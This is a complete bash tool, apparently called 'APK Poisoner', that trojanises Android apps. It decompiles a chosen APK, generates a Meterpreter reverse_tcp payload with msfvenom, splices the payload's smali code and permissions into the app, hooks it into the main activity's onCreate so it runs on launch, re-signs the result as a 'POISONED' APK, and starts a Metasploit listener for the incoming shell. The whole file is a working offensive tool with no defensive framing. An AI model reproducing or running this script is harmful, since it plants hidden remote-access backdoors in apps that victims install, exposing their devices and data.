#!/bin/bash

#Colors
green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n${red}[!] Exiting...${end}"
	tput cnorm; exit 1
}

trap ctrl_c INT

tty_size=$(stty size | awk 'NF{print $NF}')

function banner(){
  clear
	echo -e " ${turquoise}▄▄▄       ██▓███   ██ ▄█▀ ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ ▓█████  ██▀███${end}  "
	echo -e "${turquoise}▒████▄    ▓██░  ██▒ ██▄█▒ ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒${end}"
	echo -e "${turquoise}▒██  ▀█▄  ▓██░ ██▓▒▓███▄░ ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒\t\t\t\t\tＩＮＶＥＲＴＥＢＲＡＤＯ${end}"
	echo -e "${turquoise}░██▄▄▄▄██ ▒██▄█▓▒ ▒▓██ █▄ ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  \t\t\t\t${gray}GITHUB ${turquoise}https://github.com/invertebr4do${end}"
	echo -e " ${turquoise}▓█   ▓██▒▒██▒ ░  ░▒██▒ █▄▒██▒ ░  ░░ ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒\t\t\t${gray}LINKEDIN ${turquoise}https://www.linkedin.com/in/andres-ramos-invertebrado${end}"
	echo -e " ${blue}▒▒   ▓▒█░▒▓▒░ ░  ░▒ ▒▒ ▓▒▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░${end}"
	echo -e "  ${blue}▒   ▒▒ ░░▒ ░     ░ ░▒ ▒░░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░${end}"
	echo -e "  ${purple}░   ▒   ░░       ░ ░░ ░ ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░ ${end}"
	echo -e "      ${purple}░  ░         ░  ░                ░ ░   ░        ░      ░ ░           ░    ░  ░   ░     ${end}\n"
  for i in $(seq 1 $tty_size); do echo -ne ${purple}─${end}; done; echo
}

function helpPanel(){
  echo -e "\n${red}[!] Uso: $0"
  for i in $(seq 1 80); do echo -ne ${red}─${end}; done
  echo -e "\n\n\t${blue}\u2503${end}  ${purple}[-i]${end} ${yellow}Local IP/Host.${end}"
  echo -e "\t${blue}\u2503${end}  ${purple}[-p]${end} ${yellow}Local port.${end}"
  echo -e "\t${blue}\u2503${end}  ${purple}[-a]${end} ${yellow}Target APK file.${end}"
  echo -e "\t${blue}\u2503${end}  ${purple}[-h]${end} ${yellow}Show this help panel.${end}\n"
}

function compileYsign(){
	echo -e "${purple}╚═ ${blue}Building ${green}$appDir${blue} application...${end}"
	java -jar $toolsDir/apktool*.jar -q b $appDir -o modified-$appDir.apk 2>/dev/null
  if [ "$(echo $?)" != "0" ]; then
    echo -e "\n${red}═════╝ Building failed ╔═════${end}"
    tput cnorm; exit 1
  fi
  sleep 0.5; echo -e "${blue}╚═ Signing ${green}$appDir${blue} application...${end}" 
  java -jar $toolsDir/uber-apk-signer*.jar --apks modified-$appDir.apk &>/dev/null
  if [ "$(echo $?)" != "0" ]; then
    echo -e "\n${red}═════╝ Signing failed ╔═════${end}"
    tput cnorm; exit 1
  fi
}

function editPermissions(){
	echo -e "${purple}╚═ ${blue}Modifying ${green}uses-permission${blue} permissions...${end}"
	cat AndroidManifest.xml | grep "uses-permission" > ../permissions.txt 2>/dev/null && popd &>/dev/null
	cat $appDir/AndroidManifest.xml | grep "uses-permission" >> permissions.txt
	cat permissions.txt | sort -u | sponge permissions.txt
	cat $appDir/AndroidManifest.xml | sed '0,/.*uses-permission.*/s// apk-poisoner-place2set-permissions/' | grep -v "<uses-permission" | sponge $appDir/AndroidManifest.xml
	cat permissions.txt | tr -d '\n' | sed 's/\/>/\/>\\n/g' | sponge permissions.txt
	permissions=$(cat permissions.txt | sed 's/\//\\\//g')
	cat $appDir/AndroidManifest.xml | sed 's/apk-poisoner-place2set-permissions/'"$permissions"'/' | sed 's/\\n/\n/g' | sponge $appDir/AndroidManifest.xml
}

function mkYdMsfApk(){
	popd &>/dev/null
	echo -e "${purple}╚═ ${blue}Creating ${green}msf${blue} application...${end}"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o msf.apk &>/dev/null
	
	if [[ $(echo $?) -eq 0 ]]; then
		echo -e "${purple}╚═ ${blue}Decompiling ${green}msf${blue} application...${end}"
		java -jar $toolsDir/apktool*.jar -q d msf.apk 2>/dev/null && pushd msf &>/dev/null
		tar -cf - smali | ( cd ../$appDir; tar -xpf - )
		popd &>/dev/null && pushd msf &>/dev/null
	else
		echo -e "\n${red}═════╝ MSFVENOM returned an error during the creation of the malicious apk ╔═════${end}"
	fi
}

function editActivity(){
	echo -e "${purple}╚═ ${blue}Editting the ${green}$mActivityName.smali${blue} activity...${end}"
  payload=$(echo 'invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' | sed 's/\//\\\//g')
  cat $mActivityLocation | sed "s/ onCreate(Landroid\/os\/Bundle;)V/ onCreate(Landroid\/os\/Bundle;)V\n    $payload/g" | sponge $mActivityLocation
}

function findActivity(){
	echo -e "${purple}╚═ ${blue}Searching the ${green}MainActivity.smali${blue} file...${end}"
	
	cat $mActivityLocation | grep 'onCreate(Landroid/os/Bundle;)V' &>/dev/null
	
	if [[ $(echo $?) -eq 0 ]]; then
		echo -ne $mActivityLocation &>/dev/null
	else
		echo -e "\n${red}═════╝ onCreate method not found ╔═════${end}"
    tput cnorm; exit 1
	fi	
}

function decompile(){
	echo -e "${blue}╗${end}\n${purple}╚═ ${blue}Decompiling ${green}$appDir${blue} application...${end}"
	java -jar $toolsDir/apktool*.jar -q d $targetAPK 2>/dev/null && pushd $appDir &>/dev/null
}

function getTools(){
  mkdir Tools
  wget -q https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar
  wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
  mv {apktool*.jar,uber-apk-signer*.jar} Tools
}

# ~ ~ ~ MAIN ~ ~ ~

declare -i parameter_counter=0; while getopts ":i:p:a:h:" arg; do
  case $arg in
    i) lhost=$OPTARG; let parameter_counter+=1;;
    p) lport=$OPTARG; let parameter_counter+=1;;
    a) targetAPK=$OPTARG; let parameter_counter+=1;;
    h) helpPanel;;
  esac
done

tput civis; if [[ $parameter_counter -eq 0 || $parameter_counter -ne 3 ]]; then
  helpPanel
else
    rm -rf apkPoisoning; mkdir apkPoisoning 2>/dev/null; cp $targetAPK apkPoisoning && cd apkPoisoning
    targetAPK=$(echo $targetAPK | tr '/' '\n' | tail -n 1)
  
  if [[ $(file $targetAPK | grep -oP "\.apk:.*?\(APK\)") == ".apk: Android package (APK)" ]]; then
    banner
    getTools
    toolsDir=$(cd Tools && pwd)
    appDir=$(echo $targetAPK | sed 's/\.apk//g' | sed 's/\.\///')
		decompile; sleep 0.4
    mActivityName=$(cat AndroidManifest.xml | grep "<activity" -A 30 | grep "MAIN" -B 30 | grep -oP '<activity .*?android:name=".*?".*?>' | grep -oP '".*?"' | tr -d '"' | grep -oP "^\w+\.\w+.*" | tr '.' '\n' | tail -n 1)
		mActivityLocation=$(find . -name $mActivityName.smali)
    findActivity; sleep 0.4
		editActivity; sleep 0.4
		mkYdMsfApk; sleep 0.4
		editPermissions; sleep 0.4
		compileYsign; sleep 0.4
		rm -rf $appDir msf msf.apk permissions.txt modified-$appDir-aligned-debugSigned.apk.idsig modified-$appDir.apk
    mkdir ../out 2>/dev/null
    mv modified-$appDir-aligned-debugSigned.apk ../out/POISONED-$appDir.apk && cd ..; rm -rf apkPoisoning 2>/dev/null
		echo -e "${blue}╗                                                               ╔${end}"; sleep 0.2
		echo -e "${purple}╚════════════════════════════${blue}╝${green} 𝘿𝙤𝙣𝙚 ${blue}╔═${purple}══════════════════════════╝${end}"
		echo -e "${gray}                 (Starting metasploit listener...)${end}\n"; sleep 0.5
		tput cnorm; msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; exploit"
	else
    if [[ $(file $targetAPK | grep -oP "\.apk:.*?\(APK\)") != ".apk: Android package (APK)" ]]; then
      echo -e "${red}[!] ($targetAPK): Invalid apk file path${end}"
    fi
  fi
fi; tput cnorm
